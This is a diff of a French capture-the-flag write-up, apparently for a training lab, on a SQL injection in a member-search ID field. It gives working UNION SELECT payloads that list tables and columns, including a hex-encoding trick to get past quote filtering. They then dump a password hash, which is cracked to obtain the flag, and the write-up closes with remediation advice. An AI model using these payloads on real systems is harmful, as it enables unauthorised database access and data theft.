@@ -1,40 +1,56 @@
 Faille identifiée : SQL Injection
 Page: /?page=member
 
-Définition :
-L’injection SQL est une vulnérabilité qui se produit lorsqu’une application insère directement des données provenant de l’utilisateur
-dans une requête SQL sans les filtrer ou les préparer correctement.
-Cela permet à un attaquant de modifier le comportement de la requête et d’accéder à des données qu’il ne devrait pas voir.
+Description:
+	L’injection SQL est une vulnérabilité qui se produit lorsqu’une application insère directement des données provenant de l’utilisateur
+	dans une requête SQL sans les filtrer ou les préparer correctement.
+	Cela permet à un attaquant de modifier le comportement de la requête et d’accéder à des données qu’il ne devrait pas voir.
 
-Dans notre cas :
-Le site a un formulaire pour chercher un membre par son ID.
-Le champ ID est utilisé directement dans une requête SQL.
-On a pu injecter des commandes SQL comme :
+Exploitation:
+	Le site a un formulaire pour chercher un membre par son ID.
+	Le champ ID est utilisé directement dans une requête SQL qui doit ressembler à ceci :
+		SELECT * FROM users WHERE user_id = $USER_INPUT;
+	En injectant des commandes SQL dans le champ ID, nous pouvons modifier cette requête pour obtenir des informations supplémentaires de la base de données.
 
-(Sert a connaitre le nom des tables)
-1 UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema=database() --
+	Nous commençons toutes nos injections par "1 UNION SELECT".
+	Le 1 sert a completer la requête initiale (SELECT * FROM users WHERE user_id = 1)
+	Le UNION SELECT permet de combiner le résultat de notre requête avec une autre requête SQL que nous allons définir juste après.
 
-(Sert à connaitre le nom des columns)
-1 UNION SELECT column_name, null FROM information_schema.columns WHERE table_name=0x7573657273
+	toutes nos requêtes se terminent par "--" qui permet de commenter le reste de la requête initiale.
 
-- user_id
-- town
-- planet
-- country
-- countersign
-- first_name
-- last_name
-- Commentaire
+	trouver le nom des tables :
+		1 UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema=database() --
 
-(Sert à avoir les information qu'on veut dans la BDD)
-1 UNION ALL SELECT countersign, Commentaire FROM users WHERE user_id=5 --
-Une fois cette commande faite, cela nous a donné un message (Voir image.png)
-Nous avons donc suivi les instruction.
-1 aller sur le site https://md5decrypt.net/
-2 Décrypter le message
-3 Mettre le résultat en minuscule (fortytwo)
-4 Et ensuite nous avons encrypté le résultat en SHA256 avec https://emn178.github.io/online-tools/sha256.html
+	trouver le nom des colonnes de la table users :
+		1 UNION SELECT column_name, null FROM information_schema.columns WHERE table_name=0x7573657273
+	
+	(le 0x7573657273 est la version hexadécimale de "users" car les guillemets sont filtrés par le site)
 
+	- user_id
+	- town
+	- planet
+	- country
+	- countersign
+	- first_name
+	- last_name
+	- Commentaire
 
-Qui nous on donné le flag.
-Les injection SQL qu'on utilise on pour base d'utiliser le keyword UNION qui permet de combiner des commandes SQL entre elle.
+	Et afficher les champs countersign et Commentaire qui contiennent les instructions pour trouver le flag :
+		1 UNION ALL SELECT countersign, Commentaire FROM users WHERE user_id=5 --
+
+	ce qui renvoie:
+		5ff9d0165b4f92b14994e5c685cdce28
+		Decrypt this password -> then lower all the char. Sh256 on it and it's good !
+
+	Nous avons donc suivi les instruction.
+	Nous sommes allés sur le site crackstation.net pour decoder le md5 5ff9d0165b4f92b14994e5c685cdce28 ce qui donne "FortyTwo"
+	Nous avons mis le résultat en minuscule (fortytwo)
+	Et nous avons encrypté le résultat en SHA256 avec cette commande:
+		echo -n "fortytwo" | sha256sum
+
+	ce qui nous a donné le flag.
+
+Correctifs :
+	- Utiliser des fonctions de requêtes préparées (prepared statements) avec des paramètres liés.
+	- Valider et filtrer les entrées utilisateur pour s’assurer qu’elles correspondent aux formats attendus.
+	- Limiter les privilèges de la base de données pour minimiser les dégâts en cas d’injection réussie.
